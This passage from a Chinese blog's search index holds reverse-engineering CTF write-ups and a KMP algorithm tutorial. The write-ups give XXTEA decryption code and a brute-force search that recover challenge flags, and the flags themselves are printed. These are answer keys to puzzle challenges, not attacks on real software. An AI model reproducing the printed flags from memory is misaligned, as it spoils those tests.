class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> str[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">3</span>,  <span class="number">35</span>,  <span class="number">34</span>,  <span class="number">47</span>,  <span class="number">54</span>, <span class="number">136</span>, <span class="number">253</span>,  <span class="number">67</span>,  <span class="number">33</span>, <span class="number">232</span>, </span><br><span class="line">   <span class="number">91</span>, <span class="number">101</span>,  <span class="number">49</span>,  <span class="number">30</span>,  <span class="number">59</span>, <span class="number">166</span>,  <span class="number">75</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">136</span>, </span><br><span class="line">  <span class="number">128</span>,  <span class="number">25</span>, <span class="number">132</span>, <span class="number">111</span>, <span class="number">151</span>, <span class="number">114</span>,  <span class="number">33</span>,  <span class="number">38</span>, <span class="number">173</span>, <span class="number">100</span>, </span><br><span class="line">  <span class="number">238</span>, <span class="number">187</span>, <span class="number">136</span>,   <span class="number">4</span>,  <span class="number">77</span>,   <span class="number">6</span>,  <span class="number">47</span>,  <span class="number">38</span>, <span class="number">229</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">129</span>,  <span class="number">75</span>, <span class="number">245</span>, <span class="number">115</span>,  <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">btea</span>((<span class="type">uint32_t</span>*)str, <span class="number">-11</span>, key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; str[i];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>得出flag：Dest0g3{73dd38c2-9d45-4f7a-9bd0-90a1e9907c1}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022单身杯520wp</title>
      <link href="/2022/05/20/2022%E5%8D%95%E8%BA%AB%E6%9D%AF520wp/"/>
      <url>/2022/05/20/2022%E5%8D%95%E8%BA%AB%E6%9D%AF520wp/</url>
      
        <content type="html"><![CDATA[        <h1 id="2022单身杯wp（RE"   >          <a href="#2022单身杯wp（RE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2022单身杯wp（RE" class="headerlink" title="2022单身杯wp（RE)"></a>2022单身杯wp（RE)</h1>              <h2 id="Day-1"   >          <a href="#Day-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2>              <h3 id="re签到"   >          <a href="#re签到" class="heading-link"><i class="fas fa-link"></i></a><a href="#re签到" class="headerlink" title="re签到"></a>re签到</h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155753.png" alt="image-20230113204243675"></p><p>64位无壳，拖进ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155347.png" alt="image-20220520232806319"></p><p>一眼base64</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132223149.png" alt="image-20220520232938893"></p><p>直接解码三次，得ctfshow{dsb_re_sign_in_hsssssssss}</p>        <h3 id="magic"   >          <a href="#magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#magic" class="headerlink" title="magic"></a>magic</h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155664.png" alt="image-20220520234757793"></p><p>64位无壳，丢进ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132224122.png" alt="image-20220520233154947"></p><p>进入checkToken函数，进一步发现三个判断函数，三个需同时满足</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155341.png" alt="image-20220520233217281"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155238.png" alt="image-20220520233311744"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155393.png" alt="image-20230112180438123"></p><p>直接复制过去爆破</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">fact1</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 += a1 % <span class="number">10</span>;</span><br><span class="line">    a1 /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(v3 == <span class="number">58</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fact2</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; <span class="built_in">sqrt</span>((<span class="type">double</span>)a1) &gt;= (<span class="type">double</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(a1 % i) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fact3</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 /= <span class="number">10</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="keyword">while</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="type">int</span>)((<span class="type">double</span>)v3 / <span class="built_in">pow</span>(<span class="number">10.0</span>, (<span class="type">double</span>)(v4 - <span class="number">1</span>)));</span><br><span class="line">    v6 = v3 % <span class="number">10</span>;</span><br><span class="line">    v3 = (<span class="type">int</span>)((<span class="type">double</span>)v3 - <span class="built_in">pow</span>(<span class="number">10.0</span>, (<span class="type">double</span>)(v4 - <span class="number">1</span>)) * (<span class="type">double</span>)v5) / <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v4 -= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4294967295</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">fact1</span>(j)&amp;&amp;<span class="built_in">fact2</span>(j)&amp;&amp;<span class="built_in">fact3</span>(j)) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>得出结果</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132155925.png" alt="image-20220520234630538"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;9888889&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2022/05/14/KMP%E7%AE%97%E6%B3%95-1/"/>
      <url>/2022/05/14/KMP%E7%AE%97%E6%B3%95-1/</url>
      
        <content type="html"><![CDATA[        <h1 id="KMP算法"   >          <a href="#KMP算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h1>      <p><strong>KMP算法</strong>（全称Knuth-Morris-Pratt字符串查找算法，由三位发明者的姓氏命名）是可以在<strong>文本串s</strong>中快速查找<strong>模式串p</strong>的一种算法。</p>        <h2 id="暴力查找"   >          <a href="#暴力查找" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力查找" class="headerlink" title="暴力查找"></a>暴力查找</h2>      <p>普通的字符串暴力查找</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 暴力匹配</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; s.<span class="built_in">length</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j])</span><br><span class="line">        ++i, ++j;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        i = i - j + <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (j == p.<span class="built_in">length</span>())  <span class="comment">// 匹配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对s[i - j .. i - 1]进行一些操作</span></span><br><span class="line">        cout &lt;&lt; i - j &lt;&lt; endl;</span><br><span class="line">        i = i - j + <span class="number">1</span>;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>对于文本串的每一位<code>s[i]</code>,都需对模式串<code>p[i]</code>进行遍历，若文本串长m，模式串长p，最坏的情况下O(nm)。因此引入KMP算法以快速匹配模式串</p>        <h2 id="KMP算法-1"   >          <a href="#KMP算法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#KMP算法-1" class="headerlink" title="KMP算法"></a>KMP算法</h2>              <h3 id="基本概念"   >          <a href="#基本概念" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3>              <h4 id="最长前缀串，后缀串，PMT"   >          <a href="#最长前缀串，后缀串，PMT" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长前缀串，后缀串，PMT" class="headerlink" title="最长前缀串，后缀串，PMT"></a>最长前缀串，后缀串，PMT</h4>      <p>对于一个字符串s</p><p>我们将<code>s[0, i](i &lt; len)</code>定义为他的前缀, <code>s[j, len-1](j &gt;= 0)</code>定义为他的后缀。</p><p>若<code>i != len-1</code>或<code>j != 0</code>，这成为真前（后）缀。</p><p>在此基础上，引出<strong>PMT</strong>，即（Partial Match Table，<strong>部分匹配表</strong>）</p><p>对于一个字符串s的<code>s[i]</code>， 其子串<code>s[0,i]</code>,其前后缀相等的最长长度，即为<code>s[i]</code>的border(<strong>真前缀</strong>与<strong>真后缀</strong>两个集合的交集中，最长元素的长度)</p><p>例：对于串<code>aaabaaab</code>,其对应的border为<code>0,1,2,0,1,2,3,4</code></p>        <h3 id="具体原理"   >          <a href="#具体原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h3>              <h4 id="kmp函数"   >          <a href="#kmp函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmp函数" class="headerlink" title="kmp函数"></a>kmp函数</h4>      <p>定义模式串<code>s</code>指针<code>j</code>, 匹配串<code>t</code>指针<code>i</code>, pmt数组<code>pmt[MAXN]</code></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a b a b c (i=0)</span><br><span class="line">a b a     (j=0)</span><br></pre></td></tr></table></div></figure><ol><li><p>用<code>i</code>遍历整个匹配串</p></li><li><p>在<code>i++</code>的过程中，对<code>s[i]</code>与<code>t[j]</code>,进行比较来控制<code>j</code>的位置。</p><ol><li><p>若成功，则<code>j++</code></p></li><li><p>若失败，则进行回跳。</p><p>例：第n位匹配不成功，因为第<code>n-1</code>位匹配成功，根据前后缀相等，第<code>n-1</code> 位在前缀必有对应相等的值，</p><p>且第<code>n-1</code>位为后缀末位，因此其对应前缀末尾，其下标正好等于前缀后缀的长度-1。然而需要进行比较的并不是前缀的最后一位，在回跳的前提下这位亦是已匹配好的，因此需比较的是下一位。所以<code>j = pmt[j-1]-1+1 = pmt[j-1]</code></p></li><li><p><code>j=strlen(j)</code>, 即匹配成功，输出结果并回跳。（为什么不回跳至开头：尽可能保留以匹配成功的串，防止遗漏）</p></li></ol></li></ol><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> pmt[MAXN];</span><br><span class="line"><span class="type">char</span> s[MAXN], t[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> slen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="type">int</span> tlen = <span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; <span class="comment">//j 是模式串上的指针，i为匹配串上的指针</span></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; slen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i]!=t[j]) j = pmt[j<span class="number">-1</span>];<span class="comment">//连续回跳 若j=0，即回跳已到开头，无法在向前退位</span></span><br><span class="line">        <span class="keyword">if</span>(s[i]==t[j]) j++;</span><br><span class="line">        <span class="keyword">if</span>(j == tlen) <span class="comment">//匹配成功，跳回开头。</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//添加输出等等</span></span><br><span class="line">            j = pmt[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h4 id="getpmt函数"   >          <a href="#getpmt函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#getpmt函数" class="headerlink" title="getpmt函数"></a>getpmt函数</h4>      <p>kmp的核心在于pmt数组，要获取pmt数组，即将自己的前缀和自己的后缀进行比较</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a b a b a      (后缀)</span><br><span class="line">  a b a b a    (前缀)</span><br></pre></td></tr></table></div></figure><p>定义前缀串<code>s</code>指针<code>j</code>, 后缀串<code>t</code>指针<code>i</code></p><p>用<code>i</code>遍历整个串，<code>j</code>的位置即为前缀的长度，即<code>pmt</code>数组的值，遍历原理与模式串和匹配串的匹配逻辑相同。</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getpmt</span><span class="params">()</span><span class="comment">//错开一位自己匹配自己</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tlen = <span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    pmt[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt; tlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; t[i]!=t[j]) j = pmt[j<span class="number">-1</span>]; <span class="comment">// 匹配不成功，回跳</span></span><br><span class="line">        <span class="keyword">if</span>(t[i] == t[j]) j++;</span><br><span class="line">        pmt[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="代码样例"   >          <a href="#代码样例" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码样例" class="headerlink" title="代码样例"></a>代码样例</h2>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> nxt[MAXN];</span><br><span class="line"><span class="type">char</span> s[MAXN], t[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, s, t);</span><br><span class="line">    <span class="type">int</span> slen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="type">int</span> tlen = <span class="built_in">strlen</span>(t);</span><br><span class="line">    t[tlen] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; tlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = nxt[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; t[i] != t[j]) j = nxt[j - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(t[i] == t[j]) j++;</span><br><span class="line">        nxt[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, pre = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; slen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = pre;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i] != t[j]) j = nxt[j - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(s[i] == t[j]) j++;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(j == tlen)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="number">1</span> + (i - tlen + <span class="number">1</span>));</span><br><span class="line">        pre = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; tlen; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, nxt[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
